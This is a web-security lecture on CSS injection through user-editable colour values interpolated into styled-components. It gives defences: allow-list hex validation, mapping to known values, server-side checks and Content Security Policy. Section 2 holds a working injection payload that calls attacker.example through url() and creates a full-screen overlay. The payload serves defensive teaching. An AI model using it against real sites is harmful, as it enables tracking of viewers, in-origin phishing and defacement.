# Lecture 10.10 · 🛡 CSS Injection: Interpolating User-Controlled Values into Styles

> **Section:** S10 · **Type:** 📖 Theory (🔓 + 🛡) · **Track:** ★ Core · **Time:** ~25 minutes

---

## 1. The scenario

Categories have a `color` field that **users can edit** (an admin sets "Work" to blue). The API returns it; a `Tag` component uses it as a background:

```tsx
const Chip = styled.span<{ $bg: string }>`
  padding: 2px 8px;
  background: ${({ $bg }) => $bg};
`;

<Chip $bg={category.color}>{category.name}</Chip>
```

React escapes `{category.name}` as text (07.03). But `$bg` isn't rendered as text: it's **concatenated into CSS source code**. That's the same class of bug as SQL injection (S36) and XSS (S26): **untrusted data inserted into code**.

## 2. 🔓 The attack (verified on your own local app only)

Suppose an attacker (or a compromised admin account) sets a category colour to:

```text
red; background-image: url(https://attacker.example/pixel.png?who=an); position: fixed; inset: 0; z-index: 9999
```

In TaskFlow's reference app, the rule styled-components actually injected was:

```css
.kjMLJN { padding: 2px 8px; background: url("https://attacker.example/pixel.png?who=an") red; position: fixed; inset: 0px; z-index: 9999; }
```

and the element's computed style confirmed `position: fixed` and `z-index: 9999`. The `;` ended the intended declaration, and the attacker's declarations became real CSS.

What an attacker can do with CSS injection (no JavaScript needed):
- **Tracking / data exfiltration**: `url(…)` makes every viewer's browser request the attacker's server, revealing that someone viewed the page (and, with more elaborate selector tricks, sometimes leaking attribute values).
- **UI redressing**: a full-screen fixed overlay covering the real UI, e.g. a fake "session expired, log in again" form (phishing inside your own origin).
- **Defacement / denial of use**: hide buttons, cover content.

> ⚠️ Only reproduce this against your **own local** TaskFlow (00.06 rules).

## 3. 🛡 The defence: allow-list validation before the value reaches CSS

`src/domain/color.ts` (from the 09.99 exercise):

```ts
/** Strict #rrggbb check. Anything else (named colours, url(), expressions, `;`) is rejected. */
const HEX_COLOR = /^#[0-9a-fA-F]{6}$/;

export function isSafeHexColor(value: string): boolean {
  return HEX_COLOR.test(value);
}
```

```tsx
const bg = isSafeHexColor(color) ? color : FALLBACK;
<Chip $bg={bg} $fg={contrastText(bg)}>{label}</Chip>
```

Why an **allow-list**, not a deny-list:
- A deny-list ("reject strings containing `;` or `url(`") misses encodings, comments, escapes and future CSS features.
- An allow-list ("exactly `#` + 6 hex digits") can only ever produce a colour.

Other safe patterns:
- **Map to known values**: `theme.colors.priority[task.priority]`, where the key is a validated enum and the value comes from **your** code (09.09's Avatar palette does this).
- **Set a CSS custom property via `style`**: `style={{ '--tag-bg': color }}` is safer than interpolation because a custom property's value can't add declarations, but a malicious value can still inject a `url(…)` if the CSS uses `background: var(--tag-bg)`. Validate anyway.

## 4. Defence in depth

- The **server** should validate category colours on write (S37/S46), with the same allow-list, so bad data never gets stored.
- The **client** validates again on read (this lecture), because data can come from older records, other clients, or a compromised backend.
- **Content Security Policy** (S40) can restrict where images may load from (`img-src 'self'`), which blunts the `url()` exfiltration even if injection happens.

## 5. Summary

- Interpolating untrusted strings into styled-components templates is **CSS injection**.
- Verified impact: extra declarations (fixed full-screen overlay) plus external `url()` requests.
- Allow-list validation (`#rrggbb`), mapping to known values, server-side validation and CSP.
